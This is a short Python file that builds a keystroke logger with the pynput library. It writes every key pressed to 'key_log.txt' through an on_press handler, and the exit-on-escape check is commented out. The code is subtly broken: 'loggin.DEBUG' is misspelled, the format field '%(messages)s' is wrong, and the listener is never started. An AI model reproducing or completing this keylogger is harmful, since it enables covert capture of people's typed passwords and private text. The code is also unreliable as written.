# From Library located on https://github.com/moses-palmer/pynput
from pynput.keyboard import Key, Listener
# stock python module
import logging

# log file creation for key returns
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=loggin.DEBUG, format='%(asctime)s: %(messages)s:')

# captures key inputs from user
def on_press(key):
	logging.info(str(key))
	# if key == Key.esc:
		# return false
